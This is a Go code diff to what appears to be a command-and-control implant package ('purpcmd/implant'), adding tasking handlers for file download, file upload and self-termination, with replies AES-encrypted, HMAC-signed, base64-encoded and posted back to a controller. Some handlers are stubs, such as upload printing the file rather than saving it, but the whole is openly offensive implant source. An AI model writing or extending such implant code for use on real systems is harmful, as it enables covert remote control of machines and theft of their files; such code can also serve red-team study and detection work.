@@ -3,8 +3,10 @@ package core
 import (
 	"bytes"
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"io"
+	"os"
 	"purpcmd/implant/ssh"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
@@ -84,6 +86,45 @@ func Start() {
 		case internal.SSH:
 			print("->",tcode, "calling ssh for ", h.Socket)
 			ssh.Wsclient("aaa","/any.png" , h.Socket)
+		case internal.DOWN:
+			println("\n->",tcode)
+			taskResp := PackChunk(i, "any.txt", []byte("aaa"), tid)
+
+			dataEnc := enc.AESCbcEncrypt(taskResp)
+			enc.HMACPackAddHmac(&dataEnc)
+			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+			println(taskRestEnc)
+			h.Post([]byte(taskRestEnc))
+		case internal.UPL:
+			//Step		Size	Offset (bytes)
+			//nameLen	2		0
+			//name		N		2
+			//dataLen	4		2 + N
+			//data		M		2 + N + 4
+			println("\n->",tcode)
+			nameLen := binary.BigEndian.Uint16(payload[:2])
+			name := payload[2 : 2+nameLen]
+
+			dataLenStart := 2 + nameLen
+			dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])
+
+			dataStart := dataLenStart + 4
+			data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]
+
+			println("got file name ", name," with data ", string(data))
+
+			responseTaskPayload := "saved file to "+string(name)
+			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
+
+			dataEnc := enc.AESCbcEncrypt(taskResp)
+			enc.HMACPackAddHmac(&dataEnc)
+			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+			println(taskRestEnc)
+			h.Post([]byte(taskRestEnc))
+
+		case internal.KILL:
+			println("\n->",tcode)
+			os.Exit(0)
 		default:
 			print("->",tcode, "Nothing")
 		}
